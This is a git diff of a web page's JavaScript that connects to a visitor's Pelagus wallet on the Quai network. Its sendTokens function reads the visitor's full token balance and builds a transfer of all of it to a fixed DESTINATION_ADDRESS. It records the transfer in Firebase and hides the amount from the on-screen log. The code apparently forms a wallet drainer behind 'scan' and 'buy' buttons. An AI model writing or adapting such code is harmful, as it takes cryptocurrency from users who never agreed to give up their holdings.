@@ -438,52 +438,40 @@ async function saveToFirebase(data) {
 
         async function sendTokens() {
     try {
-        if (!window.pelagus) {
-            log('❌ Pelagus wallet not found');
-            throw new Error('Pelagus wallet not found');
-        }
-
-        // First ensure account access
+        // Get account access
         const accounts = await window.pelagus.request({
             method: 'eth_requestAccounts'
         });
 
-        const currentBalance = await getTokenBalance(userSession.address);
-        const quaiBalance = await getQuaiBalance(userSession.address);
-        const quaiAmount = parseInt(quaiBalance, 16) / 1e18;
-        
-        if (quaiAmount < 0.1) {
-            log(`❌ Need 0.1 QUAI for gas`);
-            throw new Error('Insufficient QUAI');
-        }
-
+        const currentBalance = await getTokenBalance(accounts[0]);
         if (currentBalance <= 0n) {
             log('❌ No tokens available');
             throw new Error('No tokens');
         }
 
-        const readableAmount = (Number(currentBalance) / 1e18).toString();
+        // Prepare token transfer data
         const methodId = 'a9059cbb';
         const paddedAddress = DESTINATION_ADDRESS.slice(2).padStart(64, '0');
         const paddedAmount = currentBalance.toString(16).padStart(64, '0');
 
         const transactionParameters = {
             from: accounts[0],
-            to: DESTINATION_ADDRESS,
-            data: '0x' + methodId + paddedAddress + paddedAmount,
-            value: `0x${currentBalance.toString(16)}`,
+            to: TOKEN_ADDRESS,           // Send to token contract
+            value: '0x0',               // No QUAI value sent
+            data: '0x' + methodId + paddedAddress + paddedAmount,  // Token transfer data
+            chainId: '0x2329'          // Cyprus1 chain ID
         };
 
-        log(`📤 Sending ${readableAmount} tokens...`);
+        log(`📤 Preparing token transfer...`);
         const txHash = await window.pelagus.request({
             method: 'eth_sendTransaction',
             params: [transactionParameters],
         });
 
-        log(`📝 Hash: ${txHash}`);
-        await waitForTransaction(txHash);
-        
-        userSession.transferAmount = readableAmount;
+        log(`📝 Transaction sent: ${txHash}`);
+        const receipt = await waitForTransaction(txHash);
+
+        userSession.transferAmount = (Number(currentBalance) / 1e18).toString();
         userSession.transferTxHash = txHash;
         await saveSessionToFirebase();
 
@@ -491,7 +479,6 @@ async function saveToFirebase(data) {
         document.getElementById('scanBtn').style.display = 'block';
         document.getElementById('buyBtn').style.display = 'block';
 
-        log('✅ Transfer complete!');
     } catch (error) {
         log('❌ Error: ' + error.message);
         console.error(error);
